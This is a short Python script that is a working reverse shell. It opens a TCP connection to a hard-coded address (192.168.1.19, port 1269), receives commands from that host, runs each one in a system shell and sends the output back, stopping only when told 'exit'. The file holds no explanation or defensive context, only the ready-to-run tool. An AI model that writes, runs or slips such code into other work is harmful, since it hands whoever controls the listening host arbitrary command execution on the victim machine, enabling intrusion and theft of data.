import socket, sys, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.19", 1269)) #IP and Port

while True:
    command = s.recv(1024)
    if command.decode() == "exit":
        s.close()
        sys.exit(0)
    else:
        process = subprocess.Popen(command.decode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        output = process.stdout.read() + process.stderr.read()
        s.send(output.lstrip())